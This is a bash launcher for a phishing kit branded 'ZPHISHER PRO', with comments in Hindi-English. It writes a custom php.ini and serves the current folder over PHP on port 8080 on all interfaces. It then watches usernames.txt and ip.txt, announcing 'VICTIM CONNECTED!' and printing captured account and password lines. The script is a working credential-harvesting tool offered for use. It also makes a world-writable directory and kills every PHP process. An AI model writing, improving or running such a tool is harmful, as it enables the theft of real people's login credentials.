#!/bin/bash

# --- 1. SETUP CUSTOM CONFIG (Ye hai asli fix) ---
# Hum ek alag folder banayenge jahan PHP ko full permission hogi
FIX_DIR="$HOME/.php_server_fix"
mkdir -p "$FIX_DIR"
chmod 777 "$FIX_DIR"

# Hum ek 'php.ini' file banayenge jo PHP ko batayegi:
# "System folder me mat jao, saari files yahi save karo"
cat > "$FIX_DIR/php.ini" <<EOF
[PHP]
sys_temp_dir = "$FIX_DIR"
upload_tmp_dir = "$FIX_DIR"
session.save_path = "$FIX_DIR"
memory_limit = 256M
display_errors = Off
log_errors = On
error_log = "$FIX_DIR/php_error.log"
EOF

# --- 2. CLEANUP ---
# Purane processes ko maaro
pkill -f php > /dev/null 2>&1

# --- 3. INTERFACE ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
RESET='\033[0m'

clear
echo -e "${GREEN}╔══════════════════════════════════════╗${RESET}"
echo -e "${GREEN}║     ${YELLOW}ZPHISHER PRO (Config Fix)${GREEN}        ║${RESET}"
echo -e "${GREEN}╚══════════════════════════════════════╝${RESET}"
echo ""
echo -e "${CYAN}[*] Initializing Custom PHP Config...${RESET}"
echo -e "${CYAN}[*] Starting Server on Port 8080...${RESET}"

# --- 4. START SERVER (With Config File) ---
# Hum '-c' flag use karenge taki PHP hamari settings padhe
php -S 0.0.0.0:8080 -c "$FIX_DIR/php.ini" -t . > /dev/null 2>&1 &
PID=$!
sleep 3

# --- 5. CHECK SUCCESS ---
if ps -p $PID > /dev/null; then
   echo -e "${GREEN}[✔] SUCCESS! Server Running Smoothly.${RESET}"
   echo -e "${YELLOW}----------------------------------------${RESET}"
   echo -e "${CYAN}Link 1: http://localhost:8080${RESET}"
   
   # IP Address
   MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
   if [ ! -z "$MYIP" ]; then
       echo -e "${CYAN}Link 2: http://$MYIP:8080${RESET}"
   fi
   
   echo -e "${YELLOW}----------------------------------------${RESET}"
   echo -e "${RED}[-] Press Ctrl + C to Stop${RESET}"
   echo ""
   echo -e "${GREEN}Waiting for Credentials...${RESET}"
   
   # Monitoring Loop
   tail -f usernames.txt ip.txt --pid=$PID 2>/dev/null | while read line; do
       if [[ "$line" == "IP:"* ]]; then
           echo -e "${GREEN}[+] VICTIM CONNECTED!${RESET}"
           echo -e "\a"
       elif [[ "$line" == *"Login info"* ]]; then
           echo -e "${RED}[!] DATA CAPTURED!${RESET}"
       elif [[ "$line" == *"Account"* ]] || [[ "$line" == *"Password"* ]]; then
           echo -e "${GREEN}$line${RESET}"
       fi
   done

else
   # Agar ab bhi fail hua to log dikhao
   echo -e "${RED}[!] ERROR: Server Crash Ho Gaya.${RESET}"
   echo -e "${YELLOW}Log File Check Karein:${RESET}"
   cat "$FIX_DIR/php_error.log"
fi
